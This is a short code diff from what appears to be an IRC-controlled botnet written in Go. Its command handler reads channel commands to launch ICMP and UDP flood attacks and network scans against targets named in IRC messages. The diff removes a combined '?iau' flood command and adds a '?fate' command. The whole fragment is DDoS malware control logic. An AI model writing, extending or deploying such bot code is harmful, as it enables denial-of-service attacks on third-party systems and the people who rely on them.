@@ -62,12 +62,10 @@ func main() {
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START ICMP FLOOD TO: "+
 					tools.IRC_Recv(ircRead, 4))
 				tools.ICMP(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
-			} else if tools.IRC_Find(ircRead, "?iau") {
+			} else if tools.IRC_Find(ircRead, "?fate") {
 				tools.DDoS_Switch = false
-				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START IAU FLOOD TO: "+
+				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START FATE PROCESS AT: "+
 					tools.IRC_Recv(ircRead, 4))
-				go tools.ICMP(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
-				go tools.UDP(tools.IRC_Recv(ircRead, 4), tools.IRC_Recv(ircRead, 5), IRC_Channel, irc)
 			} else if tools.IRC_Find(ircRead, "?scan") {
 				tools.Scan_Switch = false
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START SCANNING.")
